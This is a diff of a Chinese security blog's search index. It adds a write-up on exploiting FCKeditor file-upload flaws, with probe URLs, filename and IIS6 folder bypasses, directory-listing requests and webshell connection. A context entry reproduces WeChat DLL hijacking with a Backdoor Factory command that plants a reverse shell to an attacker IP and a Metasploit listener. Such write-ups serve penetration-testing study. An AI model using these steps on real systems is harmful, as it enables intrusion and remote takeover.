@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[FCKeditor文件上传漏洞及利用]]></title>
+    <url>%2Ffckeditor-upload%2F</url>
+    <content type="text"><![CDATA[关于FCKeditor 攻击思路 总结 一. 关于FCKeditorFCKeditor是一个网页的文本编辑器，在很多的cms里都有出现。近日工作期间遇到了不下十个有FCKeditor的站，尤其是ZF网站。 本文简单介绍通过FCKeditor上传漏洞进行攻击的思路，并对可能用到的操作进行整理。 二. 攻击思路1.查看FCKeditor版本12http://127.0.0.1/fckeditor/editor/dialog/fck_about.htmlhttp://127.0.0.1/FCKeditor/_whatsnew.html 2.测试上传点123456789101112131415161718192021222324252627FCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.htmlFCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.aspFCKeditor/_samples/default.htmlFCKeditor/editor/fckeditor.htmFCKeditor/editor/fckdialog.htmlFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.phpFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspxFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jspFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jspfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspxfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/php/connector.php 3.突破限制3.1 上传限制上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等 3.2 文件名限制3.2.1二次上传绕过文件名‘.‘修改为‘_‘FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 3.2.2提交shell.php+空格绕过空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 3.3 IIS6.0突破文件夹限制123Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z.aspFCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp 3.4 文件解析限制通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 1http://127.0.0.1/images/upload/201806/image/1.asp/1.jpg 4.列目录4.1 FCKeditor/editor/fckeditor.htmlFCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。 4.2 根据xml返回信息查看网站目录1http://127.0.0.1/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../../&amp;NewFolderName=shell.asp 4.3 获取当前文件夹123FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/ 4.4 浏览E盘文件1/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=e:/ 5. 连接木马在木马能够解析之后，使用各类工具连接到木马，获取webshell。至此，利用FCKeditor进行文件上传并攻击的过程就已经完成。 三. 其他最近的工作中遇到的站里大多数都存在FCKeditor编辑器，基本都存在以上漏洞，可以说是非常严重的问题。 在获取到webshell之后，可以进行的操作非常多，也便于提权操作，拿下主机权限并不困难。 关于该漏洞的防御，可以删除掉所有的上传点，并限制目录访问。]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>FCKeditor</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[微信DLL劫持反弹shell]]></title>
     <url>%2Fwechat-dll-hijack%2F</url>
     <content type="text"><![CDATA[准备工作 复现过程 一. 准备工作1. 测试环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：桥接模式 攻击机：kali Linux 2019.1 IP:192.168.43.143 靶机：Windows 7 ultimate sp1 x64 IP:192.168.43.109 微信版本：2.6.8 2. 使用工具the-backdoor-factory(BDF)：用于DLL注入 Process Explorer：用于查找DLL文件 Metasploit 二. 复现过程1.DLL注入1.1安装BDF在kali系统中安装BDF，具体步骤可以参考readme文档 123root@kali:~# git clone https://github.com/secretsquirrel/the-backdoor-factory.gitroot@kali:~# cd the-backdoor-factory/root@kali:~/the-backdoor-factory# ./install.sh 1.2获取DLL文件使用Process Explorer查找微信客户端需要的dll文件 理论上来讲路径在微信安装目录里的dll文件都可以使用，本文选择的是libEGL.dll。 1.3DLL注入把选择的DLL文件放入kali系统中，放置在the-backdoor-factory文件下内，运行如下命令 1./backdoor.py -f libEGL.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.43.143 其中，-f 表示被劫持的DLL 文件，-s 表示shell 的类型，-P 表示DLL 要连接远程主机的端口，-H 表示DLL 连接的远程主机，注意参数的大小写问题。 接下来选择注入类型，我这里只有一个类型可以选择，有的会有多种，可以自行尝试。在注入完成后，可以看到生成的文件在backdoored目录中。 2.反弹shell2.1将dll文件放回微信的安装目录中2.2使用Metasploit反弹shell打开MSF，设置exploit和payload 12use exploit/multi/handlerset payload windows/shell_reverse_tcp 设置好lhost和lport之后，使用exploit运行，监听shell。此时，在靶机中打开微信客户端，即接收到shell。 我的靶机里是开着Windows防火墙的，依然没有拦住，这还是说明杀毒软件是有必要的，有空着我去拿win10的靶机试试，看看defender能不能拦住。 最后再补几句吧，这应该不算是漏洞吧，因为几乎所有程序都需要调用dll，所以这个东西顶多算个劫持，所以理论上所有的程序都可以被劫持，至于原理应也很简单，在调用dll时运行植入的脚本。其实这个用来攻击应该是比较简单的，比如说网上的系统镜像，把里面的一个dll改掉，基本不太容易被发现。当然了，以上这段话都是我猜的，没有什么依据，以后如果水平够了可能会研究研究吧。]]></content>
@@ -152,10 +165,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
-        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -179,9 +192,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
+        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
@@ -228,7 +241,7 @@
   <entry>
     <title><![CDATA[使用gittalk实现hexo博客评论功能]]></title>
     <url>%2Fgitalk%2F</url>
-    <content type="text"><![CDATA[关于gitalk 使用gitalk实现hexo博客评论功能 其他 关于gitalkGitalk 是一个基于 GitHub Issue 和 Preact 开发的评论插件。 特性 使用GitHub登录 支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru] 支持个人或组织 无干扰模式（设置 distractionFreeMode 为 true 开启） 快捷键提交评论 （cmd|ctrl + enter） gitalk实现hexo博客评论功能Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 新建gitalk.swig在主题文件夹下新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 修改comments.swig修改主题文件夹内/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 修改index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 新建gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 修改third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 修改_config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 其他以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。 参考文章 https://asdfv1929.github.io/2018/01/20/gitalk/ https://liujunzhou.top/2018/8/10/gitalk-error/]]></content>
+    <content type="text"><![CDATA[关于gitalk 使用gitalk实现hexo博客评论功能 其他 一. 关于gitalkGitalk 是一个基于 GitHub Issue 和 Preact 开发的评论插件。 特性 使用GitHub登录 支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru] 支持个人或组织 无干扰模式（设置 distractionFreeMode 为 true 开启） 快捷键提交评论 （cmd|ctrl + enter） 二. gitalk实现hexo博客评论功能Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 新建gitalk.swig在主题文件夹下新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 修改comments.swig修改主题文件夹内/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 修改index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 新建gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 修改third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 修改_config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 三. 其他以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。 参考文章 https://asdfv1929.github.io/2018/01/20/gitalk/ https://liujunzhou.top/2018/8/10/gitalk-error/]]></content>
       <categories>
         <category>博客搭建</category>
       </categories>
@@ -260,8 +273,8 @@
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Metasploit</tag>
         <tag>Nmap</tag>
+        <tag>Metasploit</tag>
         <tag>ms17-010</tag>
         <tag>永恒之蓝</tag>
         <tag>漏洞复现</tag>
